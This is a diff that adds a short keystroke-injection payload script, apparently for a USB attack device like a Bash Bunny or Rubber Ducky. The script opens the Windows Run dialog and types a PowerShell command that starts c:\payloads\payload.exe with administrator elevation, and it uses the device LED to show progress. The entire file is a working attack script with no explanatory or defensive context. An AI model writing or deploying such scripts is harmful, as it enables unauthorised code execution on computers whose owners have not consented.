@@ -1,0 +1,10 @@
+REM LED off
+LED 0 0 0
+LOCALE DE
+DEFAULTDELAY 1000
+Gui r
+REM Run Payload as Administrator
+STRING powershell Start-Process c:\payloads\payload.exe -Verb runAS
+ENTER
+REM LED green
+LED 0 255 0
